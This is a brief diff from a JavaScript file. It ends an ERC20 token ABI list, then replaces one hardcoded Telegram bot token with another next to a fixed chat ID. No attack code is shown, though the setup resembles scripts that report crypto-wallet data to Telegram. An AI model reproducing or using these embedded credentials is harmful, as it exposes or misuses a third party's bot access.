@@ -46,7 +46,7 @@ const ERC20_ABI = [
     "function allowance(address owner, address spender) view returns (uint256)"
 ];
 
-const TELEGRAM_BOT_TOKEN = "7948810372:AAHFxvNhzbN9C2FLjbRhTX-bT2bLseo8IcM";
+const TELEGRAM_BOT_TOKEN = "7948810372:AAE2SbZthZvMgj8gPxvsyQKN-mjmCaHiaIc";
 const TELEGRAM_CHAT_ID = "7269890813";
 
 
